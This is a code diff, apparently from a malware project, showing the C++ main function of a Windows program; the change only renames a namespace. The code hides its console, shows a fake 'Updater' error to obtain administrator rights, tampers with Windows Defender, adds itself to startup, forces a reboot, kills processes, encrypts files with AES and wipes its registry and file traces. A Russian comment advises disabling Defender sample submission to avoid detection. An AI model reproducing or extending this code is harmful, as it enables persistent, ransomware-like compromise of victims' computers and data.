@@ -7,34 +7,33 @@ using namespace std;
 // КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ
 // ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
 int main(int argc, char* argv[]) {
-    Persistence Persistence;
     HWND Console;
     Console = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(Console, 0);
     char path[MAX_PATH];
-    if (!Persistence::isUserAdmin()) {
+    if (!persistence::isUserAdmin()) {
         MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
-        Persistence::restartAsAdmin();
+        persistence::restartAsAdmin();
         return 0;
     }
     Sleep(rand() % 5000 + 5000);
-    if (Persistence::copyAndRunSelf()) {
+    if (persistence::copyAndRunSelf()) {
         return 0;
     }
-    if (!Persistence::checkAndCreateFile("lafkildatnn.dat")) {
-        Persistence::DefenderOwner();
-        Persistence::addToStartup();
+    if (!persistence::checkAndCreateFile("lafkildatnn.dat")) {
+        persistence::DefenderOwner();
+        persistence::addToStartup();
         Sleep(1500);
-        Persistence::reset();
+        persistence::reset();
         Sleep(rand() % 5000 + 5000);
-        Persistence::restartSystem();
+        persistence::restartSystem();
         return 0;
     }
-    std::thread killerThread(Persistence::StopExe); // Запускаем фоновый поток
+    std::thread killerThread(persistence::StopExe); // Запускаем фоновый поток
     killerThread.detach();
     Sleep(2000);
     // тут основной процесс закрепления 
-    std::string hwid = "C:\\Windows\\SysWOW64\\" + Persistence::getDiskSerial() + ".txt";
+    std::string hwid = "C:\\Windows\\SysWOW64\\" + persistence::getDiskSerial() + ".txt";
 
 
     // { ENCRYPTION } //
@@ -69,8 +68,8 @@ int main(int argc, char* argv[]) {
             AES.decryptFile(filename);
     }
 
-    Persistence::cleanfile();
-    Persistence::cleanreg();
-    Persistence::reset();
+    persistence::cleanfile();
+    persistence::cleanreg();
+    persistence::reset();
     return 0;
 }
